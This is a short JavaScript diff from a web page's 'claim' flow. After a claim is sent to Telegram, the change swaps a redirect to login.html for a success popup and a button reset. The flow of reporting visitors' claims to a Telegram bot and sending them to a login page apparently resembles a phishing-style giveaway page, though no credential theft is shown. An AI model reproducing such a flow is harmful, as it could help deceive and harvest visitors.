@@ -1306,11 +1306,18 @@
             // Send notification to Telegram
             await sendClaimToTelegram(userLabel);
 
-            // Short delay so the progress bar is visible before redirect
+            // Wait for progress bar to reach 85%, then show success popup
             setTimeout(() => {
-                const targetUrl = `login.html?user=${encodeURIComponent(userLabel)}`;
-                window.location.href = targetUrl;
-            }, 600);
+                // Hide progress bar and show popup
+                if (progressContainer) progressContainer.style.display = 'none';
+                showClaimPopup();
+                
+                // Reset state so claim can be clicked again if needed
+                setTimeout(() => {
+                    claimInProgress = false;
+                    if (claimButton) claimButton.style.display = 'block';
+                }, 3000);
+            }, 3000);
         }
 
         function showClaimPopup() {
